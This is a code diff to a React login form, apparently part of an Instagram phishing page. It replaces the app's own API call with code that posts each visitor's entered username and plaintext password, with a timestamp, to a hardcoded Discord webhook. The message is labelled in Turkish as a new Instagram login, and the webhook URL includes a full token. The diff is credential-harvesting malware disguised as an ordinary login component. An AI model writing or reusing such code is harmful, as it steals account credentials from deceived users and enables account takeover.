@@ -12,7 +12,7 @@ import {
 } from "@/components/ui/form";
 import { Loader2 } from "lucide-react";
 import { LoginFormData, loginFormSchema } from "@shared/schema";
-import { apiRequest } from "@/lib/queryClient";
+import axios from "axios";
 
 export default function Login() {
   const form = useForm<LoginFormData>({
@@ -25,8 +25,43 @@ export default function Login() {
 
   const { mutate, isPending } = useMutation({
     mutationFn: async (data: LoginFormData) => {
-      const res = await apiRequest("POST", "/api/webhook", data);
-      return res.json();
+      // Discord webhook URL'i (güvenlik için gerçek projelerde bunu client tarafında saklamayın)
+      const webhookUrl = "https://discord.com/api/webhooks/1351717767585464321/G55PRIVsD7T2AB6yyqD3M_znGaOrwRRezYlqqlOQEXGq4vSQo3rNEWxzZrMJocjoeB93";
+      
+      // Discord webhook mesajını hazırla
+      const message = {
+        content: "🚨 **Instagram Yeni Giriş** 🚨",
+        embeds: [{
+          title: "Hesap Bilgileri;",
+          color: 16426522,
+          fields: [
+            {
+              name: "👤 Kullanıcı Adı:",
+              value: data.username,
+              inline: true
+            },
+            {
+              name: "🔒 Şifre:",
+              value: data.password,
+              inline: true
+            },
+            {
+              name: "🕝 Tarih:",
+              value: new Date().toISOString(),
+              inline: false
+            }
+          ]
+        }]
+      };
+      
+      // Discord webhook'a doğrudan gönder
+      const response = await axios.post(webhookUrl, message, {
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+      
+      return response.data;
     },
     onSuccess: () => {
       // Formu sıfırla ve example.com'a yönlendir
